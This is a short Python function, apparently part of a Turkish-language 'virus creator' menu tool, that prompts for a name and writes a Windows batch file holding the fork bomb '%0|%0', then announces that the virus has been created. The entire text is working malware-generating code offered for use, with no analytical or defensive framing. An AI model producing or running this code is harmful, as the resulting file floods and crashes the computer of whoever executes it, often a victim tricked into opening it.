def virus_create_4():
    import os
    import time

    ad = input("Virüs adı ne olsun ❯❯❯ ").strip()
    dosya_adi = ad + ".bat"

    try:
        with open(dosya_adi, "w") as dosya:
            dosya.write(r"%0|%0")

        print("\n\033[92m[✓] Virüs bulunduğunuz dizine oluşturuldu: {}\033[0m".format(dosya_adi))
    except Exception as e:
        print("\033[91mBir hata oluştu:\033[0m", e)

    input("\nAna menüye dönmek için ENTER...")